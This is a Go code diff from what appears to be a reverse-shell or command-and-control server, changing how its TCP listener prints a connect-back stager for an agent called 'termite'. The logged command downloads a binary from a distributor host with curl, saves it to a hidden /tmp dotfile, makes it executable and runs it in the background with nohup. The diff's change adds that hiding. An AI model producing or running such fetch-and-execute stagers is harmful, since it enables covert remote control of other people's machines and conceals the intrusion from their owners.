@@ -205,10 +205,11 @@ func (s *TCPServer) Run() {
 
 	if s.Encrypted {
 		for _, ifname := range s.Interfaces {
+			listenerHostPort := fmt.Sprintf("%s:%d", ifname, s.Port)
+			log.Warn("Connect back to: %s", listenerHostPort)
 			for _, ifaddr := range Ctx.Distributor.Interfaces {
 				distributorHostPort := fmt.Sprintf("%s:%d", ifaddr, Ctx.Distributor.Port)
-				listenerHostPort := fmt.Sprintf("%s:%d", ifname, s.Port)
-				filename := str.RandomString(0x08)
+				filename := fmt.Sprintf("/tmp/.%s", str.RandomString(0x08))
 				command := "curl -fsSL http://" + distributorHostPort + "/termite/" + listenerHostPort + " -o " + filename + " && chmod +x " + filename + " && bash -c '/usr/bin/nohup " + filename + " &'"
 				log.Warn("\t`%s`", command)
 			}
